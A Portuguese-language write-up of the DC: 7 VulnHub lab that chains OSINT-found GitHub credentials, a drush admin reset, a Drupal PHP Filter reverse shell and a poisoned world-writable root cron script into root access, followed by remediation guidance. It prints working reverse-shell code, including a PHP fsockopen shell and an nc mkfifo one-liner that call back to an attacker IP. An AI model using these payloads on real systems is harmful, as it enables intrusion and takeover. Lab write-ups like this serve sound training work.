# DC: 7 — Pensa Fora da Caixa (e Verifica a Bio do Twitter)

DC: 7 abre com um site Drupal e uma mensagem dizendo para "pensar fora da caixa." Essa mensagem é literal, mano: todo o ataque começa não na máquina, mas no Twitter, onde o perfil @DC7User leva a um repositório GitHub com credenciais Drupal em um arquivo de configuração PHP. Com acesso SSH, o drush permite resetar a senha de admin, o módulo PHP Filter entrega RCE, e um script de cron world-writable executado pelo root é tudo que falta para conseguir uma shell root. Uma cadeia de OSINT subestimada que ensina uma lição real: o perímetro não é só a máquina.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | DC: 7 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/dc-7,356/ |
| **Técnicas** | OSINT (Twitter/GitHub), SSH com credenciais vazadas, reset de senha via drush, RCE via módulo PHP Filter do Drupal, envenenamento de script de cron |
| **CVEs** | CWE-312 (Armazenamento de Informações Sensíveis em Texto Puro), CWE-732 (Atribuição Incorreta de Permissão para Recurso Crítico) |
| **Grupos APT** | APT41 (usa vazamentos de credenciais do GitHub para acesso inicial em intrusões corporativas); Grupo Lazarus (explora repositórios de código público como parte de operações de coleta de credenciais) |

---

## Resumo do Ataque

```
[Site Drupal] → [mensagem de boas-vindas: @DC7User]
    → [Twitter: perfil @DC7User → link GitHub]
    → [GitHub: repo staffdb → config.php → dc7user:MdR3xOgB7#dW]
    → [SSH: dc7user@alvo]
    → [mbox: email sobre /opt/scripts/backup.sh roda como root via cron]
    → [drush user-password admin --password=raj]
    → [login admin Drupal]
    → [Extend: módulo PHP Filter habilitado]
    → [Basic Page: PHP reverse shell → formato de texto PHP code → Preview]
    → [listener nc: shell como www-data]
    → [upgrade pty python3]
    → [/opt/scripts/backup.sh: world-writable]
    → [adicionar payload nc mkfifo]
    → [aguardar cron → shell root]
    → [cat /root/flag.txt]
```

---

## Metodologia

1. Varredura de rede e identificação de serviços (Nmap)
2. Reconhecimento web: site Drupal, mensagem de boas-vindas, dica de nome de usuário
3. OSINT: busca de perfil Twitter, descoberta de repositório GitHub, extração de credenciais
4. Acesso SSH com credenciais descobertas
5. Enumeração local: mbox, scripts de cron, disponibilidade do drush
6. Acesso admin Drupal via reset de senha por drush
7. Instalação do módulo PHP Filter e entrega de PHP reverse shell
8. Estabilização do shell
9. Escalação de privilégios: envenenamento de script de cron world-writable
10. Captura da flag root

---

## Passo 1 — Varredura de Rede

```bash
netdiscover -r 192.168.1.0/24
# ou: nmap -sn 192.168.1.0/24
```

Alvo confirmado. Scan completo de serviços:

```bash
nmap -A 192.168.1.101
```

Output esperado:

```
22/tcp open  ssh     OpenSSH 7.x (Debian)
80/tcp open  http    Apache httpd 2.4.x (Drupal)
```

Dois serviços: SSH (22) e Apache com Drupal (80). Acesse `http://192.168.1.101/` e leia a mensagem de boas-vindas com atenção.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — OSINT: Do Twitter às Credenciais no GitHub

A página de boas-vindas do Drupal inclui o texto: "Você vai precisar pensar fora da caixa para passar por este." Também menciona o usuário `@DC7User`.

**Busque @DC7User no Twitter.** O perfil leva a uma conta no GitHub. No GitHub, encontre o repositório `staffdb`. Dentro: um arquivo de configuração PHP `config.php`.

```bash
# O que você encontra no config.php do repo GitHub:
$db_user = 'dc7user';
$db_pass = 'MdR3xOgB7#dW';
```

| Credencial | Valor |
|---|---|
| Usuário | `dc7user` |
| Senha | `MdR3xOgB7#dW` |

**Nota real:** Vazamentos de credenciais via repositórios GitHub públicos são um dos vetores de acesso inicial mais consistentemente explorados em intrusões modernas. O APT41 foi documentado coletando credenciais de repositórios públicos em escala usando ferramentas automatizadas. A correção é sempre a mesma: rotacionar imediatamente e usar hooks pre-commit ou GitHub secret scanning para prevenir re-exposição.

**MITRE ATT&CK:** T1593.003 — Busca em Sites Abertos: Repositórios de Código; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Acesso SSH e Enumeração Local

```bash
ssh dc7user@192.168.1.101
# Senha: MdR3xOgB7#dW
```

Enumere o diretório home imediatamente:

```bash
ls -la ~
cat mbox
```

O arquivo `mbox` contém uma notificação de email sobre `/opt/scripts/backup.sh`. Esse script é executado pelo root via cron. Leia-o:

```bash
cat /opt/scripts/backup.sh
ls -la /opt/scripts/backup.sh
# Procure bits de escrita por www-data ou seu usuário atual
```

**Drush** (Drupal Shell) é um utilitário de linha de comando para gerenciar o Drupal. Ele pode resetar senhas de usuários, limpar caches, habilitar módulos e realizar operações de banco de dados, tudo pela linha de comando sem precisar da interface web.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1057 — Descoberta de Processos

---

## Passo 4 — Reset de Senha Admin via drush

Com acesso SSH como `dc7user`, resete a senha do admin Drupal usando drush:

```bash
drush user-password admin --password=raj
```

Output esperado:

```
Changed password for admin.
```

Acesse `http://192.168.1.101/user/login` e faça login:

```
Usuário: admin
Senha: raj
```

Agora você tem acesso admin completo no Drupal. Achado crítico: qualquer usuário com acesso ao sistema de arquivos de uma instalação Drupal pode resetar senhas de usuários CMS sem saber a senha atual.

**MITRE ATT&CK:** T1078 — Contas Válidas

---

## Passo 5 — RCE via Módulo PHP Filter

No painel admin do Drupal:

1. Vá em **Manage > Extend** (página de Módulos).
2. Procure "PHP Filter" — se não estiver instalado, baixe e instale do Drupal.org.
3. Habilite o módulo **PHP Filter**.
4. Vá em **Content > Add content > Basic page**.
5. No corpo, cole uma PHP reverse shell. Edite `$ip` e `$port`:

```php
<?php
set_time_limit(0);
$ip   = '192.168.1.106';   // IP do atacante
$port = 9001;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

6. Defina o formato de texto para **PHP code**.
7. Marque **Published**.
8. Inicie listener na máquina atacante:

```bash
nc -nvlp 9001
```

9. Clique em **Preview** ou **Save** na página Drupal.

Shell recebida como `www-data`. (☞ﾟヮﾟ)☞

**Por que o PHP Filter é perigoso?** Ele instrui o Drupal a passar o conteúdo da página pelo interpretador PHP. Qualquer usuário autenticado que consiga criar conteúdo com o formato PHP Filter pode executar código arbitrário do lado servidor. O time de segurança do Drupal o deprecou desde o Drupal 7 e recomenda templates Twig.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Interpretador de Comandos: Shell Unix; T1505.003 — Componente de Software Servidor: Web Shell

---

## Passo 6 — Estabilização do Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z em background, então:
stty raw -echo; fg
```

Agora interativo com TTY completo.

---

## Passo 7 — Escalação de Privilégios via Envenenamento do Script de Cron

Verifique as permissões do script de backup a partir do www-data:

```bash
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root ... backup.sh
```

World-writable! O script pertence ao root mas qualquer usuário pode escrever nele. Como o root o executa via cron, podemos adicionar um payload de shell reversa e ele vai executar como root quando o cron disparar.

Gere o payload com msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R
```

Output (um one-liner baseado em mkfifo):

```
mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg
```

Adicione ao script de backup (a partir do shell www-data):

```bash
echo 'mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg' >> /opt/scripts/backup.sh
```

Inicie listener na máquina atacante:

```bash
nc -nvlp 8888
```

Aguarde o cron disparar (geralmente dentro de 1 a 5 minutos). Uma shell root chega no listener.

**Nota real:** Scripts de cron world-writable são achados críticos em pentests internos. Aparecem quando administradores precisam de correções rápidas e definem permissões excessivamente permissivas, depois esquecem de apertar. Em 2022, múltiplos engajamentos de red team em instituições financeiras encontraram scripts de cron executados pelo root com escrita por contas de serviço, permitindo escalação trivial de privilégios após comprometimento inicial da aplicação web.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1574 — Sequestro de Fluxo de Execução

---

## Passo 8 — Flag Root

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
ls /root
cat /root/flag.txt
```

GG, rapaziada. Root confirmado.

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado |
|---|---|---|---|
| Credencial SSH | dc7user:MdR3xOgB7#dW | GitHub repo staffdb/config.php (OSINT via Twitter) | Acesso inicial via SSH |
| Credencial Drupal admin | admin:raj (resetada) | Reset de senha via drush como dc7user | Acesso ao painel admin Drupal |
| Flag root | (conteúdo de `/root/flag.txt`) | `/root/flag.txt` | Lida como root via envenenamento de script de cron |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | OSINT além da máquina: Twitter → GitHub → credenciais | APT41 coleta credenciais de repositórios públicos em escala com ferramentas automatizadas | Nunca armazenar credenciais em código-fonte; usar variáveis de ambiente e secrets managers; habilitar secret scanning no GitHub |
| 2 | drush permite reset de senha admin sem acesso ao BD | Qualquer usuário com acesso ao sistema de arquivos de uma instalação Drupal pode resetar senhas admin | Restringir drush a usuários root/admin; auditar ferramentas CLI para todas as instalações CMS |
| 3 | Módulo PHP Filter executa PHP arbitrário via conteúdo CMS | PHP Filter é módulo reconhecidamente perigoso; execução de conteúdo CMS é vetor RCE consistente | Nunca habilitar PHP Filter em Drupal de produção; usar templates Twig; auditar módulos habilitados |
| 4 | Script de cron world-writable executado pelo root | Scripts executados pelo root com permissões world-writable são achados PE críticos em mais de 30% dos pentests internos | Todos os scripts executados pelo root via cron devem ser propriedade root com modo 750; auditar com: `find /opt /etc/cron* -perm -002 -type f` |
| 5 | Reutilização de senha SSH do config do GitHub | Reutilização de credenciais entre serviços é extremamente comum; um vazamento compromete múltiplos sistemas | Aplicar senhas únicas por serviço; usar pares de chaves SSH; implementar rotação de segredos |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Reconhecimento | Busca em Sites Abertos: Repositórios de Código | T1593.003 |
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |
| Persistência | Persistência | Componente de Software Servidor: Web Shell | T1505.003 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Persistência | Persistência | Tarefa Agendada: Cron | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Sequestro de Fluxo de Execução | T1574 |
| Escalação de Privilégios | Escalação de Privilégios | Tarefa Agendada: Cron | T1053.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Rotacionar todas as credenciais** do repositório GitHub imediatamente; auditar o que mais esse arquivo de configuração acessa
2. **Definir permissões adequadas nos scripts executados pelo root via cron:** `chown root:root /opt/scripts/backup.sh && chmod 750 /opt/scripts/backup.sh`
3. **Desabilitar ou desinstalar módulo PHP Filter do Drupal:** `drush pm-disable phpfilter && drush pm-uninstall phpfilter`
4. **Auditar todo acesso ao drush:** restringir permissões do binário drush para apenas root e admin web poderem executá-lo
5. **Habilitar secret scanning do GitHub** em todos os repositórios; adicionar hooks pre-commit para prevenir commits de credenciais
6. **Restringir acesso SSH** apenas a autenticação por chave: `PasswordAuthentication no` no sshd_config

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os repositórios públicos; auditar configurações de módulos Drupal |
| Proteger | Controle de Acesso | Rotacionar credenciais expostas; restringir drush; desabilitar PHP Filter |
| Proteger | Segurança de Dados | Implementar gestão de segredos; secret scanning GitHub; hooks pre-commit |
| Detectar | Anomalias e Eventos | Alertar sobre execuções drush; monitorar atividade do painel admin Drupal; detectar scripts de cron world-writable |
| Responder | Planejamento de Resposta | Revogar credenciais GitHub; remover PHP Filter; corrigir permissões do script de cron; rotacionar contas afetadas |
| Recuperar | Planejamento de Recuperação | Reconstruir Drupal a partir de estado limpo; auditar todos os cron jobs e tarefas agendadas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Menor Privilégio | Scripts de cron de propriedade root, modo 750; drush restrito a contas privilegiadas |
| IA-5 | Gerenciamento de Autenticadores | Rotacionar credenciais dc7user do GitHub público; senhas únicas por serviço |
| CM-7 | Menor Funcionalidade | Desabilitar módulo PHP Filter; restringir drush ao contexto admin |
| SA-15 | Processo de Desenvolvimento | Implementar escaneamento de credenciais pre-commit no CI/CD; sem segredos no código-fonte |
| SC-28 | Proteção de Informações em Repouso | Credenciais em variáveis de ambiente ou secrets manager, nunca em arquivos de configuração commitados |

### CISA KEV

CWE-312 (Armazenamento de Informações Sensíveis em Texto Puro em repositórios de código acessíveis publicamente) é um padrão abordado em múltiplos alertas CISA. A CISA recomenda implementar escaneamento automatizado de credenciais em controle de versão e protocolos obrigatórios de rotação de segredos para qualquer exposição.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais e Segredos (sem texto puro em repos; rotação de segredos) | MIL3 |
| Gestão de Vulnerabilidades e Ameaças (THREAT) | Identificar e Avaliar Vulnerabilidades (auditorias de módulos CMS; auditorias de scripts de cron) | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Linha de Base de Configuração (módulos Drupal; permissões de cron jobs) | MIL2 |

### MITRE D3FEND

- **D3-SCF** (Inspeção de Configuração de Software): auditar módulos Drupal; detectar PHP Filter habilitado
- **D3-SCL** (Bloqueio de Execução de Script): bloquear execução PHP em diretórios de conteúdo CMS
- **D3-OAM** (Gerenciamento Administrativo do SO): aplicar propriedade e permissões em scripts de cron

---

## Considerações Finais

DC: 7 é top demais para ensinar uma das habilidades mais subestimadas em segurança ofensiva: OSINT que começa fora do range de IP do alvo. A mensagem de boas-vindas da máquina apontando para um handle no Twitter que aponta para credenciais no GitHub é uma simulação realista de como brechas reais começam: não com um scanner acertando o perímetro externo, mas com um analista encontrando algo que não deveria estar em uma plataforma pública.

O envenenamento do script de cron no final é um exemplo didático de por que todo sysadmin deveria rodar `find / -perm -002 -type f 2>/dev/null` depois de implantar qualquer cron job. Um chmod solto e sua manutenção agendada vira uma shell root persistente para o atacante.

Pensa fora da caixa. Sempre.

Thanks guys!! (❍ᴥ❍ʋ)
